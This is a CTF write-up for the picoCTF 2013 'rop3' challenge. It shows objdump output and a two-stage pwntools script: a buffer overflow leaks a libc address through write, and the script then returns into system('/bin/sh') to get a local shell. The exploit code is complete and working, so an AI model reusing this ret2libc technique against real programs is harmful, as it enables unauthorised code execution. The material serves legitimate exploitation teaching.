### S0lv3d by H4yicl3

First i download source here :https://2013.picoctf.com/problems/rop3-7f3312fe43c46d26

the rop3 look like rop2 and rop1 but we can't find the address of system and /bin/sh
so we need to leak it from libc when the program running!
try to read the linked library (plt and got) http://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got

so we use the function write(stdout,address,size) to write the address of got function 
i use pwntools to support : https://github.com/Gallopsled/pwntools

we need found the address by using the objdump and IDA
```
objdump -R rop3

rop3:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   read						<---- the address of read_got
0804a004 R_386_JUMP_SLOT   getegid					
0804a008 R_386_JUMP_SLOT   __gmon_start__
0804a00c R_386_JUMP_SLOT   __libc_start_main
0804a010 R_386_JUMP_SLOT   write					<---- the address of write_got
0804a014 R_386_JUMP_SLOT   setresgid

.plt:080483A0                 jmp     ds:off_804A010	<---- the address of write_plt

.text:08048474 vulnerable_function proc near           ; CODE XREF: main+Ep <---- the address of vulnerable_function
```

the python script
```python
from pwn import *

context(arch = 'i386',os = 'linux')

s = process("./rop3",shell = True)	#excute the binary

padding ="A"*140
vulnerable_function = 0x08048474
write_plt 			= 0x080483A0
return_after_write 	= vulnerable_function
stdout				= 1
write_got			= 0x0804a010
size				= 4

payload = padding + p32(write_plt) + p32(return_after_write) + p32(stdout) + p32(write_got) + p32(size)

s.sendline(payload)
address_write_got=u32(s.recv(4))

print hex(address_write_got) 
```

try run it
```
python rop3_local.py 
[+] Starting local process None: Done
0xf7654fe0
[*] Stopped program None
```

we have the address of write_got but when run again the address will difference
so we need to use it to leak the address system and /bin/sh to excute that in the program when the program running

we use libc-database to know the offset of system and bin/sh
https://github.com/niklasb/libc-database
```
hayicle@ubuntu:~/ctf/pwntools/libc-database$ ./find write 0xf7654fe0
ubuntu-trusty-i386-libc6 (id libc6_2.19-0ubuntu6.9_i386)

hayicle@ubuntu:~/ctf/pwntools/libc-database$ ./dump libc6_2.19-0ubuntu6.9_i386
offset___libc_start_main_ret = 0x19af3
offset_system = 0x00040310				<----- the offset of system@got
offset_memset = 0x0007c9c0
offset_dup2 = 0x000db920
offset_read = 0x000daf60
offset_atoi = 0x000318e0
offset_printf = 0x0004d410
offset_puts = 0x000657e0
offset_write = 0x000dafe0				<----- the offset of write_got
offset_str_bin_sh = 0x16084c			<----- the offset of bin/sh

```

the python script look like
```python
from pwn import *

context(arch = 'i386',os = 'linux')

s = process("./rop3",shell = True)	#excute the binary

padding ="A"*140
vulnerable_function = 0x08048474
write_plt 			= 0x080483A0
return_after_write 	= vulnerable_function
stdout				= 1
write_got			= 0x0804a010
size				= 4

payload = padding + p32(write_plt) + p32(return_after_write) + p32(stdout) + p32(write_got) + p32(size)

s.sendline(payload)
address_write_got=u32(s.recv(4))

print hex(address_write_got) 
#stage2
offset_write = 0x000dafe0 
offset_binsh = 0x16084c
offset_system = 0x00040310

address_libc_base = address_write_got - offset_write
address_of_system = address_libc_base + offset_system
address_of_binsh = address_libc_base + offset_binsh
return_after_system = "junk"

payload2 = padding + p32(address_of_system) + return_after_system + p32(address_of_binsh)
s.sendline(payload2)

s.interactive()
```

try run it 
```
python rop3_local.py 
[+] Starting local process None: Done
0xf763ffe0
[*] Switching to interactive mode
$ whoami
hayicle
```

well play!!

